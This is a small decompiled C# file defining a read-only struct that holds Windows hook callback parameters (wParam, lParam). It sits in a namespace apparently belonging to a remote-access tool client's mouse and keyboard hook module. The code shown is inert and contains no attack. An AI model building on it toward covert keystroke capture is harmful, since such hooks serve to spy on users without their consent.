using System;

namespace xClient.Core.MouseKeyHook.WinApi
{
	// Token: 0x02000070 RID: 112
	internal struct CallbackData
	{
		// Token: 0x0600030F RID: 783 RVA: 0x00003773 File Offset: 0x00001973
		public CallbackData(IntPtr wParam, IntPtr lParam)
		{
			this.m_WParam = wParam;
			this.m_LParam = lParam;
		}

		// Token: 0x17000067 RID: 103
		// (get) Token: 0x06000310 RID: 784 RVA: 0x00003783 File Offset: 0x00001983
		public IntPtr WParam
		{
			get
			{
				return this.m_WParam;
			}
		}

		// Token: 0x17000068 RID: 104
		// (get) Token: 0x06000311 RID: 785 RVA: 0x0000378B File Offset: 0x0000198B
		public IntPtr LParam
		{
			get
			{
				return this.m_LParam;
			}
		}

		// Token: 0x0400013C RID: 316
		private readonly IntPtr m_LParam;

		// Token: 0x0400013D RID: 317
		private readonly IntPtr m_WParam;
	}
}
